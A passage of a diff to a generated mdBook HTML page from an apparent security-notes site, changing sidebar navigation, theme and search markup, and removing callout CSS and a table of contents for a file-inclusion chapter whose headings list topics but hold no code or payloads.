aria-hidden="true">3.3.6.</strong> Kubernetes Basics</a></li></ol></li><li class="chapter-item "><a href="../../../../general/networking/index.html"><strong aria-hidden="true">3.4.</strong> Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/networking/networking_introduction.html"><strong aria-hidden="true">3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/networking/cisco/index.html"><strong aria-hidden="true">3.4.2.</strong> Cisco Network Technician</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/networking/cisco/networking_basics.html"><strong aria-hidden="true">3.4.2.1.</strong> Networking Basics</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../general/processes/index.html"><strong aria-hidden="true">3.5.</strong> Processes</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/processes/bbh_process.html"><strong aria-hidden="true">3.5.1.</strong> Bug Bounty Hunting Process</a></li><li class="chapter-item "><a href="../../../../general/processes/incident_handling_process.html"><strong aria-hidden="true">3.5.2.</strong> Incident Handling Process</a></li><li class="chapter-item "><a href="../../../../general/processes/pt_process.html"><strong aria-hidden="true">3.5.3.</strong> Penetration Testing Process</a></li></ol></li><li class="chapter-item "><a href="../../../../general/programming/index.html"><strong aria-hidden="true">3.6.</strong> Programming</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/programming/assembly/assembly.html"><strong aria-hidden="true">3.6.1.</strong> Assembly</a></li><li class="chapter-item "><a href="../../../../general/programming/bash.html"><strong aria-hidden="true">3.6.2.</strong> Bash</a></li><li class="chapter-item "><a href="../../../../general/programming/python/python.html"><strong aria-hidden="true">3.6.3.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/programming/python/sans573/cheatsheet.html"><strong aria-hidden="true">3.6.3.1.</strong> 573 Cheatsheet</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">3.7.</strong> RegEx</div></li><li class="chapter-item "><a href="../../../../general/reporting/index.html"><strong aria-hidden="true">3.8.</strong> Reporting</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/reporting/bbh_reporting.html"><strong aria-hidden="true">3.8.1.</strong> Bug Bounty</a></li><li class="chapter-item "><a href="../../../../general/reporting/pt_reporting.html"><strong aria-hidden="true">3.8.2.</strong> Penetration Test</a></li><li class="chapter-item "><a href="../../../../security_incident_reporting.html"><strong aria-hidden="true">3.8.3.</strong> Security Incident</a></li></ol></li><li class="chapter-item "><a href="../../../../general/webdev/index.html"><strong aria-hidden="true">3.9.</strong> WebDev</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/webdev/sylius.html"><strong aria-hidden="true">3.9.1.</strong> Sylius</a></li><li class="chapter-item "><a href="../../../../general/webdev/symfony.html"><strong aria-hidden="true">3.9.2.</strong> Symfony</a></li></ol></li></ol></li></ol>
+            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
+                                <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
                         <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
@@ -125,14 +129,13 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
                     </div>
@@ -149,12 +152,7 @@
 
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
-                            <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
-                            </div>
-                        </div>
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -174,361 +172,7 @@
 
                 <div id="content" class="content">
                     <main>
-                        <style>
-.mdbook-callouts {
-  padding: 8px 16px;
-  margin-bottom: 16px;
-  border-radius: 4px;
-  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
-  background: var(--mdbook-callouts-background);
-}
-
-.mdbook-callouts > *:first-child {
-  margin-top: 0;
-}
-
-.mdbook-callouts > *:last-child {
-  margin-bottom: 0;
-}
-
-.mdbook-callouts-title {
-  display: flex;
-  font-weight: 600;
-  align-items: center;
-  line-height: 1;
-  color: var(--mdbook-callouts-color);
-  text-transform: capitalize;
-}
-
-.mdbook-callouts-icon {
-  display: inline-block;
-  width: 1em;
-  height: 1em;
-  margin-right: 0.2em;
-  background-color: currentColor;
-  -webkit-mask: no-repeat center / 100%;
-  mask: no-repeat center / 100%;
-  -webkit-mask-image: var(--mdbook-callouts-icon);
-  mask-image: var(--mdbook-callouts-icon);
-}
-
-/* icons at: https://lucide.dev/icons/ */
-
-.mdbook-callouts-info {
-  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
-  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
-  /* https://lucide.dev/icons/info */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
-}
-
-.mdbook-callouts-note {
-  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
-  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
-  /* https://lucide.dev/icons/pencil */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-tip,
-.mdbook-callouts-hint {
-  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
-  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
-  /* https://lucide.dev/icons/flame */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-important {
-  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
-  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
-  /* https://lucide.dev/icons/alert-circle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
-}
-
-.mdbook-callouts-success,
-.mdbook-callouts-check,
-.mdbook-callouts-done {
-  --mdbook-callouts-color: rgb(var(--color-green-rgb));
-  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
-  /* https://lucide.dev/icons/check */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-question,
-.mdbook-callouts-help,
-.mdbook-callouts-faq {
-  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
-  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
-  /* https://lucide.dev/icons/help-circle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-warning,
-.mdbook-callouts-warn {
-  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
-  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
-  /* https://lucide.dev/icons/alert-triangle */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-caution {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/shield-alert */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-failure,
-.mdbook-callouts-fail,
-.mdbook-callouts-missing {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/x */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
-}
-
-.mdbook-callouts-error,
-.mdbook-callouts-danger {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/zap */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
-}
-
-.mdbook-callouts-bug {
-  --mdbook-callouts-color: rgb(var(--color-red-rgb));
-  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
-  /* https://lucide.dev/icons/bug */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
-}
-
-.mdbook-callouts-examples,
-.mdbook-callouts-example {
-  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
-  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
-  /* https://lucide.dev/icons/list */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
-}
-
-.mdbook-callouts-quote {
-  --mdbook-callouts-color: rgb(158, 158, 158);
-  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
-  /* https://lucide.dev/icons/quote */
-  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
-}
-
-
-.ayu {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.light {
-  --color-red-rgb: 233, 49, 71;
-  --color-red: #e93147;
-  --color-orange-rgb: 236, 117, 0;
-  --color-orange: #ec7500;
-  --color-yellow-rgb: 224, 172, 0;
-  --color-yellow: #e0ac00;
-  --color-green-rgb: 8, 185, 78;
-  --color-green: #08b94e;
-  --color-cyan-rgb: 0, 191, 188;
-  --color-cyan: #00bfbc;
-  --color-blue-rgb: 8, 109, 221;
-  --color-blue: #086ddd;
-  --color-purple-rgb: 120, 82, 238;
-  --color-purple: #7852ee;
-  --color-pink-rgb: 213, 57, 132;
-  --color-pink: #d53984;
-}
-
-.coal {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.navy {
-  --color-red-rgb: 251, 70, 76;
-  --color-red: #fb464c;
-  --color-orange-rgb: 233, 151, 63;
-  --color-orange: #e9973f;
-  --color-yellow-rgb: 224, 222, 113;
-  --color-yellow: #e0de71;
-  --color-green-rgb: 68, 207, 110;
-  --color-green: #44cf6e;
-  --color-cyan-rgb: 83, 223, 221;
-  --color-cyan: #53dfdd;
-  --color-blue-rgb: 2, 122, 255;
-  --color-blue: #027aff;
-  --color-purple-rgb: 168, 130, 255;
-  --color-purple: #a882ff;
-  --color-pink-rgb: 250, 153, 205;
-  --color-pink: #fa99cd;
-}
-
-.rust {
-  --color-red-rgb: 233, 49, 71;
-  --color-red: #e93147;
-  --color-orange-rgb: 236, 117, 0;
-  --color-orange: #ec7500;
-  --color-yellow-rgb: 224, 172, 0;
-  --color-yellow: #e0ac00;
-  --color-green-rgb: 8, 185, 78;
-  --color-green: #08b94e;
-  --color-cyan-rgb: 0, 191, 188;
-  --color-cyan: #00bfbc;
-  --color-blue-rgb: 8, 109, 221;
-  --color-blue: #086ddd;
-  --color-purple-rgb: 120, 82, 238;
-  --color-purple: #7852ee;
-  --color-pink-rgb: 213, 57, 132;
-  --color-pink: #d53984;
-}
-</style>
-<ul>
-<li><a href="#file-inclusion">File Inclusion</a>
-<ul>
-<li><a href="#intro">Intro</a>
-<ul>
-<li><a href="#examples-of-vulnerable-code---php">Examples of Vulnerable Code - PHP</a></li>
-<li><a href="#examples-of-vulnerable-code---nodejs">Examples of Vulnerable Code - NodeJS</a></li>
-<li><a href="#examples-of-vulnerable-code---java">Examples of Vulnerable Code - Java</a></li>
-<li><a href="#examples-of-vulnerable-code---net">Examples of Vulnerable Code - .NET</a></li>
-</ul>
-</li>
-<li><a href="#file-disclosure">File Disclosure</a>
-<ul>
-<li><a href="#local-file-inclusion">Local File Inclusion</a>
-<ul>
-<li><a href="#basic-lfi">Basic LFI</a></li>
-<li><a href="#path-traversal">Path Traversal</a></li>
-<li><a href="#filename-prefix">Filename Prefix</a></li>
-<li><a href="#appended-extensions">Appended Extensions</a></li>
-<li><a href="#second-order-attacks">Second Order Attacks</a></li>
-</ul>
-</li>
-<li><a href="#basic-bypasses">Basic Bypasses</a>
-<ul>
-<li><a href="#non-recursive-path-traversal-filters">Non-Recursive Path Traversal Filters</a></li>
-<li><a href="#encoding">Encoding</a></li>
-<li><a href="#approved-paths">Approved Paths</a></li>
-<li><a href="#appended-extension">Appended Extension</a>
-<ul>
-<li><a href="#path-truncation">Path Truncation</a></li>
-<li><a href="#null-bytes">Null Bytes</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#php-filters">PHP Filters</a>
-<ul>
-<li><a href="#input-filters">Input Filters</a></li>
-<li><a href="#fuzzing-for-php-filters">Fuzzing for PHP Filters</a></li>
-<li><a href="#standard-php-inlcusion">Standard PHP Inlcusion</a></li>
-<li><a href="#source-code-disclosure">Source Code Disclosure</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#remote-code-execution">Remote Code Execution</a>
-<ul>
-<li><a href="#php-wrappers">PHP Wrappers</a>
-<ul>
-<li><a href="#data">Data</a>
-<ul>
-<li><a href="#checking-php-configurations">Checking PHP Configurations</a></li>
-<li><a href="#remote-code-execution-1">Remote Code Execution</a></li>
-</ul>
-</li>
-<li><a href="#input">Input</a></li>
-<li><a href="#expect">Expect</a></li>
-</ul>
-</li>
-<li><a href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a>
-<ul>
-<li><a href="#local-vs-remote-file-inclusion">Local vs. Remote File Inclusion</a></li>
-<li><a href="#verify-rfi">Verify RFI</a></li>
-<li><a href="#rce-with-rfi">RCE with RFI</a>
-<ul>
-<li><a href="#http">HTTP</a></li>
-<li><a href="#ftp">FTP</a></li>
-<li><a href="#smb">SMB</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#lfi-and-file-uploads">LFI and File Uploads</a>
-<ul>
-<li><a href="#image-upload">Image Upload</a>
-<ul>
-<li><a href="#crafting-malicious-image">Crafting Malicious Image</a></li>
-<li><a href="#uploaded-file-path">Uploaded File Path</a></li>
-</ul>
-</li>
-<li><a href="#zip-upload">Zip Upload</a></li>
-<li><a href="#phar-uploads">Phar Uploads</a></li>
-</ul>
-</li>
-<li><a href="#log-poisoning">Log Poisoning</a>
-<ul>
-<li><a href="#php-session-poisoning">PHP Session Poisoning</a></li>
-<li><a href="#server-log-poisoning">Server Log Poisoning</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#automated-scanning">Automated Scanning</a>
-<ul>
-<li><a href="#fuzzing-parameters">Fuzzing Parameters</a></li>
-<li><a href="#lfi-wordlists">LFI wordlists</a></li>
-<li><a href="#fuzzing-server-files">Fuzzing Server Files</a>
-<ul>
-<li><a href="#server-webroot">Server Webroot</a></li>
-<li><a href="#server-logsconfigs">Server Logs/Configs</a></li>
-</ul>
-</li>
-<li><a href="#lfi-tools">LFI Tools</a></li>
-<li><a href="#prevention">Prevention</a>
-<ul>
-<li><a href="#file-inclusion-prevention">File Inclusion Prevention</a></li>
-<li><a href="#preventing-directory-traversal">Preventing Directory Traversal</a></li>
-<li><a href="#web-server-configuration">Web Server Configuration</a></li>
